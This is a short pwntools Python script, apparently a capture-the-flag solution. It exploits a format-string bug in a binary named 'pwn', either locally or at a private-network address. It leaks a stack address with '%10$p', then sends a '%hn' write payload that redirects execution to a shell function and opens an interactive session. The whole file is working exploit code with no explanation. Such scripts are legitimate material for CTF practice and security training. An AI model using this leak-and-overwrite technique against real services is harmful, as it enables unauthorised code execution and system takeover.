from pwn import *
import LibcSearcher

file = "./pwn"
elf = ELF(file)

context(arch=elf.arch,os='linux')

if args['DEBUG']:
    context.log_level = 'debug'


if args['REMOTE']:
    io = remote('192.168.202.151', 32768)
else:
    io = process(file)


    
if elf.arch == 'i386':
    B = 4
elif elf.arch == 'amd64':
    B = 8
else:
    print("PLS Input The Address Byte: ")
    B = int(input())
print("B=" +str(B))
    
sla = lambda ReceivedMessage,SendMessage :io.sendlineafter(ReceivedMessage,SendMessage)
sl = lambda SendMessage :io.sendline(SendMessage)
sa = lambda ReceivedMessage,SendMessage :io.sendafter(ReceivedMessage,SendMessage)
rcv = lambda ReceiveNumber, TimeOut=Timeout.default :io.recv(ReceiveNumber, TimeOut)
rcu = lambda ReceiveStopMessage, Drop=False, TimeOut=Timeout.default :io.recvuntil(ReceiveStopMessage,Drop,TimeOut)

sl(b"supersecureuser")

sla(b"Write Something\n",b"%10$p")

leak_addr = int(io.recv(14), 16) +8 - 0x50
success("Leak Address:" + hex(leak_addr))

shell_addr = 0x1261 +1
payload = "%{}c%8$hnAAAAA".format(shell_addr).encode() + p64(leak_addr)
print(payload)
sl(b"supersecureuser")
#gdb.attach(io)

sla(b"Write Something",payload)

io.interactive()
